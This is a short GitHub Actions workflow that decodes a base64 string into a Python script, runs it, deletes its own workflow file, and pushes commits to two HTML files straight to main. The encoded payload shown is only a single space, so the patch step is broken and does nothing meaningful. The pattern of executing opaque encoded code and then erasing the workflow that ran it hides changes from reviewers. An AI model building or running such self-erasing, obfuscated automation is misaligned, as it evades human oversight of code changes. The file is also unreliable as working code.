name: ESS full draft preservation safeguard

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/draft-preservation-envelope.yml'

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Preserve draft fields across older schema
        shell: bash
        run: |
          echo ' ' | base64 -d > /tmp/patch.py
          python3 /tmp/patch.py
      - name: Commit verified safeguard and clean workflow
        shell: bash
        run: |
          git config user.name "ESS verified patch"
          git config user.email "actions@users.noreply.github.com"
          git rm .github/workflows/draft-preservation-envelope.yml
          git add Hayden_H.html omar-v.html
          git diff --cached --check
          git commit -m "Preserve all Omar and Hayden draft fields"
          git push origin main
